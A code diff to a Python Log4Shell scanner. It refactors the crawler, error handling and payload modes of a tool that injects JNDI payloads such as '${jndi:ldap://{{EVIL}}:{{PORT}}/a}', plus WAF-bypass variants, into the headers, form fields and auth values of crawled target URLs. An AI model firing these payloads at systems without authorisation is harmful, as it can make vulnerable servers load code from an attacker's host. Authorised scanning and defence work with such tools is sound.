@@ -32,6 +32,8 @@ HEADER_CLASSIC = {'Accept': '*/*',
 PAYLOAD_CLASSIC = ['${jndi:ldap://{{EVIL}}:{{PORT}}/a}', '${jndi:ldap://127.0.0.1#{{EVIL}}:{{PORT}}/a}']
 PAYLOAD_FILES = {'ldap': 'waf_bypass_ldap.txt', 'http': 'waf_bypass_http.txt', 'dns': 'waf_bypass_dns.txt'}
 
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
 ###
 def crawler_add2queue(path, url, queue):
   if path.startswith(url) and path not in queue:
@@ -48,19 +50,6 @@ def crawler_get_url(url, html, queue):
       if path and path.startswith('/'):
         path = urljoin(url, path)
       crawler_add2queue(path, url, queue)
-
-
-###
-def crawler(url):
-  urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-  queue = []
-  queue.append(url)
-
-  for u in queue:
-    html = requests.get(u, verify=False).text
-    cprint('[!]   -> ' + u, 'cyan')
-    crawler_get_url(u, html, queue)
-  return queue
 
 
 ###
@@ -85,7 +74,7 @@ def get_payloads(_payload, _evil_site, _evil_port, _callback):
       chaos = random.randint(1, len(tmp_payloads))
       payloads.append(tmp_payloads[chaos])
 
-  elif _payload == 'full':
+  elif _payload == 'extended':
     with open(PAYLOAD_FILES[_callback], 'r') as fp:
       for line in fp.readlines():
         line = line.strip()
@@ -117,14 +106,19 @@ def get_headers(header, payload):
 
 ### 
 def scanner(_url, _evil_site, _evil_port, _callback, _method, _param, _header, _data, _payload):
-  urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
   payloads = get_payloads(_payload, _evil_site, _evil_port, _callback)
   max_payloads = len(payloads)
   cpt_payloads = 1
 
-  chaos = str(random.randint(1, len(HEADER_UA)))
-  response = requests.get(_url, headers={'User-agent': HEADER_UA[chaos]}, verify=False)
-  soup = BeautifulSoup(response.content, 'html.parser')
+  try:
+    chaos = str(random.randint(1, len(HEADER_UA)))
+    response = requests.get(_url, headers={'User-agent': HEADER_UA[chaos]}, verify=False)
+    soup = BeautifulSoup(response.content, 'html.parser')
+  except:
+    cprint('[!] FATAL: the given URL is not reachable', 'red', attrs=['bold'])
+    return 
+
+  cprint(f'[!]   -> HTTP Code {response.status_code}', 'cyan')
 
   for payload in payloads:
     now = datetime.now()
@@ -152,8 +146,9 @@ def scanner(_url, _evil_site, _evil_port, _callback, _method, _param, _header, _
         creds64_m = creds64_b.decode('ascii')
         headers.update({'Authorization': 'Basic ' + creds64_m})
         requests.request(url=_url, method='GET', headers=headers, verify=False, timeout=TIMEOUT)
+        cpt_payloads = cpt_payloads + 1
         continue 
- 
+
       try:
         soup_inputs = soup.find_all('input')
         soup_action = soup.form['action']
@@ -203,7 +198,6 @@ def scanner(_url, _evil_site, _evil_port, _callback, _method, _param, _header, _
 
 ### 
 def main():
-
   if len(sys.argv) <= 1:
     print('\n%s -h for help.' % (sys.argv[0]))
     exit(0)
@@ -218,7 +212,7 @@ def main():
   parser.add_argument('--param', action='store', default='classic', dest='param', help='none or classic')
   parser.add_argument('--header', action='store', default='classic', dest='header', help='none, classic or noua')
   parser.add_argument('--data', action='store', default='classic', dest='data', help='classic or full')
-  parser.add_argument('--payload', action='store', default='classic', dest='payload', help='classic or full')
+  parser.add_argument('--payload', action='store', default='classic', dest='payload', help='classic, random or extended')
   args = parser.parse_args()
 
   try:
@@ -287,12 +281,25 @@ def main():
 
     for main_url in _url:
       if _crawl == 'yes':
-        cprint(f'[!] Crawling {main_url}', 'cyan')
-        queue = crawler(main_url)
-        for sub_url in queue:
-          cprint(f'[!] Scanning {sub_url}', 'cyan')
-          scanner(sub_url, _evil_site, _evil_port, _callback, _method, _param, _header, _data, _payload)
+        cprint('[!] -------------------------------------', 'cyan')
+        cprint(f'[!] Processing {main_url}', 'cyan', attrs=['bold'])
+
+        queue = []
+        queue.append(main_url)
+
+        for u in queue:
+          try:
+            html = requests.get(u, verify=False).text
+          except:
+            cprint('[!] FATAL: the given URL is not reachable', 'red', attrs=['bold'])
+            continue
+          cprint('[!] Crawling ' + u, 'cyan')
+          crawler_get_url(u, html, queue)
+          cprint(f'[!] Scanning {u}', 'cyan')
+          scanner(u, _evil_site, _evil_port, _callback, _method, _param, _header, _data, _payload)
       else:
+        cprint('[!] -------------------------------------', 'cyan')
+        cprint(f'[!] Processing {main_url}', 'cyan', attrs=['bold'])
         cprint(f'[!] Not Crawling {main_url}', 'cyan')
         cprint(f'[!] Scanning {main_url}', 'cyan')
         scanner(main_url, _evil_site, _evil_port, _callback, _method, _param, _header, _data, _payload)
